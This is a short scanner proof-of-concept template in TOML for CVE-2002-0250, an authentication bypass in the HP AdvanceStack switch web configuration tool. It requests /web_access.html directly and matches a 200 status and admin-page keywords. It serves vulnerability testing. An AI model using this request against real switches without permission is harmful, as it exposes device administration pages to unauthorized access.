[info]
author = "ave"
description = "验证 HP AdvanceStack 交换机 Web 配置工具身份认证绕过漏洞，通过直接访问 web_access.html 绕过认证"
id = "POC-AVE-2002-0231"
name = "CVE-2002-0250 PoC"
severity = "high"
tags = ["ave-2002-0231"]
vuln_id = [
    "CVE-2002-0250",
    "AVE-2002-0231",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/web_access.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "web_access",
    "configuration",
    "password",
    "admin",
    "switch",
    "configuration",
    "HP",
    "AdvanceStack",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
